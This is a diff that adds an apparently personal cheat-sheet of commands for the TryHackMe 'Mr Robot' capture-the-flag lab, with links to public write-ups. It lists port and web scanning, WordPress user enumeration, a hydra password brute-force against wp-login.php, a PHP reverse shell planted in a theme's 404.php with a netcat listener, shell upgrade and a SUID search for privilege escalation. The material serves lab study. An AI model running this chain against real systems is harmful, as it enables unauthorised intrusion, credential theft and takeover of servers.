@@ -1,0 +1,60 @@
+nmap -sn 127.0.0.1/24
+nmap -sV -sC 127.0.0.1
+nmap -A -p- -v 127.0.0.1
+sudo nmap -sC -sV -O -p- 127.0.0.1
+nmap -sS -sV -p- 127.0.0.1
+nmap -A 127.0.0.1
+nikto -h 127.0.0.1
+
+dirsearch -u 127.0.0.1 -t 50 -w medium.txt 
+gobuster dir -u 127.0.0.1 -w file
+gobuster dir -u http://10.10.173.33 -w /usr/share/wordlists/dirb/common.txt -o dirs.txt
+
+sudo wpscan --url 127.0.0.1 -e u
+sudo wpscan --url 127.0.0.1 -U username.txt
+sudo wpscan --url 127.0.0.1 -U user -P password.txt
+
+hydra -L fsocity.dic -p 123453453 {IP} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
+
+if you find wordpress file then go to : appearance > editor > 404.php or goto wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen
+
+and edit ip is tun0 ip
+
+wp-content/theme/twentyfifteen/404.php
+
+Upload php shell and trigure with nc -lvnp 1234
+
+After listening
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+ls -la
+pwd
+cd /home
+cd robot
+ls
+cat 
+su robot
+ls -la
+cat 
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+
+https://gtfobins.github.io/
+
+ls
+whoami
+cd root
+ls
+cat 
+
+
+https://sparshjazz.medium.com/tryhackme-mr-robot-ctf-writeup-d2ccad34e6b7
+https://medium.com/@aayanx41/tryhackme-mr-robot-ctf-242a35afd946
+https://infosecwriteups.com/mr-robot-ctf-weiteup-tryhackme-vulnhub-a995b45e1eea
+
+
+
+
+
+
+
